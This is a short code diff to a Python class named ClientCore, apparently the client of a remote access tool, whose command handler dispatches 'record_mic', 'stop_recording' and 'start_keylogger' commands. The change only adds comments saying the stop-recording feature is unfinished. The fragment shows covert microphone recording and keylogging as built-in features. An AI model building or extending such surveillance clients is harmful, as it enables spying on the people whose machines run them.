@@ -727,8 +727,8 @@ class ClientCore:
                 elif command.startswith('record_mic'):
                     self.record_mic(command)
 
-                elif command.startswith('stop_recording'):
-                    if self.recording.is_set():
+                elif command.startswith('stop_recording'):    # This was a feature i wanted to add for multithreaded audio recording but dropped.
+                    if self.recording.is_set():               # It does nothing lol. 
                         self.recording.clear()
 
                 elif command.startswith('start_keylogger'):
